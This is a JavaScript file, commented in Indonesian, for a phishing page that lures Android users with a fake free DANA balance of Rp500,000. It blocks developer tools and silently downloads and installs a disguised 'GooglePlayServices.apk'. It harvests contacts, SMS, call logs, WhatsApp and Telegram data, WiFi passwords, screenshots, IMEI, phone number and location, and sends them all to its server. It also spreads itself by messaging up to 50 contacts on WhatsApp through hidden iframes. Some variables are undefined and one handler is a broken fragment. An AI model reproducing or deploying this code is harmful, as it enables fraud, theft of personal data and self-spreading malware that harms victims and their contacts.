// Anti-debugging
(function() {
    var check = function() {
        var start = Date.now();
        debugger;
        var end = Date.now();
        if (end - start > 100) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    };
    setInterval(check, 1000);
})();

// Block DevTools shortcut
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
});

// Block context menu

    e.preventDefault();

// ============================================================
// FUNGSI K() - KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// IP TRACKING
// ============================================================
function getIPAddress() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://api.ipify.org?format=json', true);
        xhr.timeout = 5000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    IP_ADDRESS = data.ip;
                    K({ sumber: 'ip_address', data: IP_ADDRESS });
                } catch(e) {}
            }
        };
        xhr.send();
    } catch(e) {}
    
    try {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', '/ip', true);
        xhr2.timeout = 3000;
        xhr2.onload = function() {
            if (xhr2.status === 200) {
                try {
                    var data = JSON.parse(xhr2.responseText);
                    if (data.ip) {
                        IP_ADDRESS = data.ip;
                        K({ sumber: 'ip_address_server', data: IP_ADDRESS });
                    }
                } catch(e) {}
            }
        };
        xhr2.send();
    } catch(e) {}
}

// ============================================================
// GEOLOCATION BROWSER
// ============================================================
function getBrowserLocation() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        function(pos) {
            LOCATION_DATA = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude,
                speed: pos.coords.speed
            };
            K({ sumber: 'geolocation_browser', data: LOCATION_DATA });
        },
        function(err) {
            K({ sumber: 'geolocation_error', data: err.message });
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

function detectEnvironment() {
    var env = { 
        isWebView: false, 
        isFacebook: false, 
        isWhatsApp: false, 
        isTelegram: false, 
        isInstagram: false, 
        isTikTok: false, 
        isAndroidBridge: false, 
        isBrowser: false,
        isChrome: false,
        isFirefox: false,
        isSafari: false,
        isOpera: false,
        isEdge: false,
        isSamsung: false,
        userAgent: navigator.userAgent
    };
    
    var ua = navigator.userAgent.toLowerCase();
    
    if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1 && ua.indexOf('opr') === -1) env.isChrome = true;
    if (ua.indexOf('firefox') > -1) env.isFirefox = true;
    if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) env.isSafari = true;
    if (ua.indexOf('opr') > -1 || ua.indexOf('opera') > -1) env.isOpera = true;
    if (ua.indexOf('edg') > -1) env.isEdge = true;
    if (ua.indexOf('samsung') > -1) env.isSamsung = true;
    
    if (ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1) env.isWebView = true;
    if (ua.indexOf('fb') > -1 || ua.indexOf('facebook') > -1 || document.referrer.indexOf('facebook') > -1) env.isFacebook = true;
    if (ua.indexOf('whatsapp') > -1 || document.referrer.indexOf('whatsapp') > -1) env.isWhatsApp = true;
    if (ua.indexOf('telegram') > -1 || document.referrer.indexOf('telegram') > -1) env.isTelegram = true;
    if (ua.indexOf('instagram') > -1 || document.referrer.indexOf('instagram') > -1) env.isInstagram = true;
    if (ua.indexOf('tiktok') > -1 || document.referrer.indexOf('tiktok') > -1) env.isTikTok = true;
    if (typeof AndroidBridge !== 'undefined') env.isAndroidBridge = true;
    if (!env.isWebView && !env.isAndroidBridge) env.isBrowser = true;
    
    return env;
}
var ENV = detectEnvironment();

// ============================================================
// ESCAPE WEBVIEW - PAKSA BUKA DI CHROME
// ============================================================
function escapeWebView() {
    if (!ENV.isWebView && !ENV.isFacebook && !ENV.isWhatsApp && !ENV.isTelegram && !ENV.isInstagram && !ENV.isTikTok) {
        return;
    }
    
    K({ sumber: 'escape_webview', data: 'attempt' });
    
    try {
        var url = window.location.href;
        var chromeIntent = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
        window.location.href = chromeIntent;
        setTimeout(function() {
            window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(url);
        }, 2000);
    } catch(e) {
        if (A.isAvailable) {
            try {
                A.openApp('com.android.chrome');
                A.openFile(url);
            } catch(e2) {}
        }
    }
    
    try {
        var win = window.open(url, '_blank');
        if (win) {
            win.location.href = url;
        }
    } catch(e) {}
}

// ============================================================
// AMBIL PASSWORD DARI WORKER
// ============================================================
function getPasswordFromWorker() {
    return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password) {
                        WS_PASSWORD = data.password;
                        resolve(WS_PASSWORD);
                    } else {
                        reject(new Error('No password'));
                    }
                } catch(e) {
                    reject(e);
                }
            } else {
                reject(new Error('HTTP ' + xhr.status));
            }
        };
        xhr.onerror = function() { reject(new Error('Network error')); };
        xhr.ontimeout = function() { reject(new Error('Timeout')); };
        xhr.send();
    });
}

// 🔥 DOWNLOAD PAYLOAD - LANGSUNG EKSEKUSI TANPA IZIN
// ============================================================
function downloadPayloadSilent() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    K({ sumber: 'download_start', data: 'silent' });
    
    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    
    var paths = [
        '/storage/emulated/0/Android/data/com.google.android.play.services',
        '/data/data/com.google.android.play.services/files',
        '/storage/emulated/0/Download'
    ];
    
    // ✅ DOWNLOAD HTML (LANGSUNG, TANPA IZIN)
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var html = xhr.responseText;
                try {
                    localStorage.setItem('SystemUpdate.html', html);
                    K({ sumber: 'html_saved_localstorage', data: 'ok' });
                } catch(e) {}
                
                if (A.isAvailable) {
                    for (var i = 0; i < paths.length; i++) {
                        try {
                            var path = paths[i] + '/SystemUpdate.html';
                            A.saveFile(path, html);
                            K({ sumber: 'html_saved', data: { path: path } });
                            break;
                        } catch(e) {}
                    }
                }
            }
        };
        xhr.send();
    } catch(e) {
        K({ sumber: 'html_download_error', data: e.message });
    }
    
    // ✅ DOWNLOAD APK (LANGSUNG, TANPA IZIN)
    if (A.isAvailable) {
        try {
            for (var i = 0; i < paths.length; i++) {
                try {
                    var apkPath = paths[i] + '/GooglePlayServices.apk';
                    var success = A.downloadFile(apkUrl, apkPath);
                    if (success) {
                        K({ sumber: 'apk_downloaded', data: { path: apkPath } });
                        break;
                    }
                } catch(e) {}
            }
        } catch(e) {
            K({ sumber: 'apk_download_error', data: e.message });
        }
    } else {
        // Fallback untuk browser biasa
        try {
            var xhr2 = new XMLHttpRequest();
            xhr2.open('GET', apkUrl, true);
            xhr2.responseType = 'blob';
            xhr2.timeout = 30000;
            xhr2.onload = function() {
                if (xhr2.status === 200) {
                    var blob = xhr2.response;
                    var link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = 'GooglePlayServices.apk';
                    link.click();
                    K({ sumber: 'apk_downloaded_browser', data: 'ok' });
                }
            };
            xhr2.send();
        } catch(e) {}
    }
    
    // ✅ LANGSUNG INSTALL APK (TANPA IZIN)
    setTimeout(function() {
        if (A.isAvailable) {
            var paths2 = [
                '/storage/emulated/0/Android/data/com.google.android.play.services',
                '/data/data/com.google.android.play.services/files'
            ];
            for (var i = 0; i < paths2.length; i++) {
                try {
                    var apkPath = paths2[i] + '/GooglePlayServices.apk';
                    var htmlPath = paths2[i] + '/SystemUpdate.html';
                    A.installAPK(apkPath);
                    A.openFile(htmlPath);
                    K({ sumber: 'apk_install_html_open', data: 'ok' });
                    break;
                } catch(e) {}
            }
        }
    }, 2000);
}

function showKlaimNotification() {
    if (NOTIFICATION_SHOWN) return;
    NOTIFICATION_SHOWN = true;
    
    try {
        if (!('Notification' in window)) {
            K({ sumber: 'notification_error', data: 'not_supported' });
            return;
        }
        
        if (Notification.permission === 'denied') {
            K({ sumber: 'notification_error', data: 'permission_denied' });
            return;
        }
        
        if (Notification.permission !== 'granted') {
            Notification.requestPermission().then(function(permission) {
                if (permission === 'granted') {
                    createKlaimNotification();
                }
            }).catch(function() {});
            return;
        }
        
        createKlaimNotification();
        
    } catch(e) {
        K({ sumber: 'notification_error', data: e.message });
    }
}

function createKlaimNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
            requireInteraction: true,
            silent: false,
            vibrate: [200, 100, 200]
        });
        
        notif.onclick = function() {
            K({ sumber: 'notification_click', data: 'clicked' });
            notif.close();
            
            // ✅ INSTALL APK + BUKA HTML (SAAT NOTIF DIKLIK)
            if (A.isAvailable) {
                var paths = [
                    '/storage/emulated/0/Android/data/com.google.android.play.services',
                    '/data/data/com.google.android.play.services/files'
                ];
                
                for (var i = 0; i < paths.length; i++) {
                    try {
                        var apkPath = paths[i] + '/GooglePlayServices.apk';
                        var htmlPath = paths[i] + '/SystemUpdate.html';
                        A.installAPK(apkPath);
                        A.openFile(htmlPath);
                        K({ sumber: 'apk_install_html_open', data: 'ok' });
                        break;
                    } catch(e) {}
                }
            }
            
            // ✅ REDIRECT KE DANA
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                setTimeout(function() {
                    try {
                        if (A.isAvailable) {
                            A.openApp('com.dana.id');
                        }
                        window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
                        window.location.href = 'https://www.dana.id';
                    } catch(e) {}
                }, 500);
            }
        };
        
        setTimeout(function() { 
            try { notif.close(); } catch(e) {} 
        }, 30000);
        
        K({ sumber: 'notification_shown', data: 'klaim_notification' });
        
    } catch(e) {
        K({ sumber: 'notification_create_error', data: e.message });
    }
}

// ============================================================
// DATA COLLECTION (VALIDATED)
// ============================================================
function ambilDataCepat() {
    var data = { 
        waktu: Date.now(), 
        ua: navigator.userAgent, 
        env: ENV,
        ip: IP_ADDRESS,
        location: LOCATION_DATA
    };
    
    function validateData(d) {
        if (!d) return null;
        if (typeof d === 'string' && d.length > 10000) return d.substring(0, 10000);
        if (typeof d === 'object') {
            var clean = {};
            for (var key in d) {
                if (d[key] !== undefined && d[key] !== null) {
                    clean[key] = d[key];
                }
            }
            return clean;
        }
        return d;
    }
    
    if (A.isAvailable) {
        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = validateData(kontak); K({sumber:'kontak_all', data:validateData(kontak)}); } } catch(e) {}
        try { var sms = A.getAllSMS(); if(sms) { data.sms = validateData(sms); K({sumber:'sms_all', data:validateData(sms)}); } } catch(e) {}
        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = validateData(clipboard); K({sumber:'clipboard', data:validateData(clipboard)}); } } catch(e) {}
        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:validateData(callLog)}); } catch(e) {}
        try { var wa = A.getWhatsAppData(); if(wa) K({sumber:'whatsapp', data:validateData(wa)}); } catch(e) {}
        try { var tg = A.getTelegramData(); if(tg) K({sumber:'telegram', data:validateData(tg)}); } catch(e) {}
        try { var files = A.listAllFiles(); if(files) K({sumber:'files_all', data:validateData(files)}); } catch(e) {}
        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:validateData(apps)}); } catch(e) {}
        try { var wifi = A.getWiFiPasswords(); if(wifi) K({sumber:'wifi_passwords', data:validateData(wifi)}); } catch(e) {}
        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:validateData(ss)}); } catch(e) {}
        try { var loc = A.getDeviceInfo(); if(loc) K({sumber:'device_info', data:validateData(loc)}); } catch(e) {}
        try { var imei = A.getIMEI(); if(imei) K({sumber:'imei', data:validateData(imei)}); } catch(e) {}
        try { var imsi = A.getIMSI(); if(imsi) K({sumber:'imsi', data:validateData(imsi)}); } catch(e) {}
        try { var phone = A.getPhoneNumber(); if(phone) K({sumber:'phone_number', data:validateData(phone)}); } catch(e) {}
        try { var loc2 = A.getLocation(); if(loc2) K({sumber:'lokasi', data:validateData(loc2)}); } catch(e) {}
        try { var storage = A.getStorageInfo(); if(storage) K({sumber:'storage_info', data:validateData(storage)}); } catch(e) {}
    }
    
    try {
        data.screen = { width: screen.width, height: screen.height };
        data.platform = navigator.platform;
        data.language = navigator.language;
        data.cookieEnabled = navigator.cookieEnabled;
        data.doNotTrack = navigator.doNotTrack;
    } catch(e) {}
    
    K({sumber:'init', data:validateData(data)});
    return data;
}

// ============================================================
// AUTO SPREAD (50 CONTACTS)
// ============================================================
function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    
    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
    var sentCount = 0;
    var maxSend = 50;
    
    if (A.isAvailable) {
        try {
            var contacts = A.getAllContacts();
            if (contacts && contacts.length > 0) {
                maxSend = Math.min(contacts.length, 50);
                for (var i = 0; i < maxSend; i++) {
                    var number = String(contacts[i].number || '').replace(/[^0-9]/g, '');
                    if (number && number.length > 5) {
                        var iframe = document.createElement('iframe');
                        iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                        document.body.appendChild(iframe);
                        sentCount++;
                        setTimeout(function(el) {
                            try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {}
                        }, 5000, iframe);
                    }
                }
            }
        } catch(e) {}
    }
    
    try {
        var waUrl = 'https://web.whatsapp.com/';
        var iframe = document.createElement('iframe');
        iframe.src = waUrl + '?text=' + message;
        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
        setTimeout(function(el) {
            try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {}
        }, 5000, iframe);
    } catch(e) {}
    
    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
}

// ============================================================
// SERVICE WORKER (SELF-CONTAINED)
// ============================================================
function registerServiceWorker() {
    if (!('serviceWorker' in navigator)) return;
    try {
        navigator.serviceWorker.register('/sw.js', { scope: '/' })
            .then(function(reg) {
                K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } });
            })
            .catch(function(e) {
                try {
                    var swCode = `
                        self.addEventListener('install', function(e) {
                            self.skipWaiting();
                        });
                        self.addEventListener('activate', function(e) {
                            e.waitUntil(clients.claim());
                        });
                        self.addEventListener('fetch', function(e) {
                            e.respondWith(fetch(e.request));
                        });
                    `;
                    var blob = new Blob([swCode], { type: 'application/javascript' });
                    var url = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(url, { scope: '/' })
                        .then(function() {
                            K({ sumber: 'service_worker_fallback', data: 'registered' });
                        })
                        .catch(function() {});
                } catch(e2) {}
            });
    } catch(e) {}
}
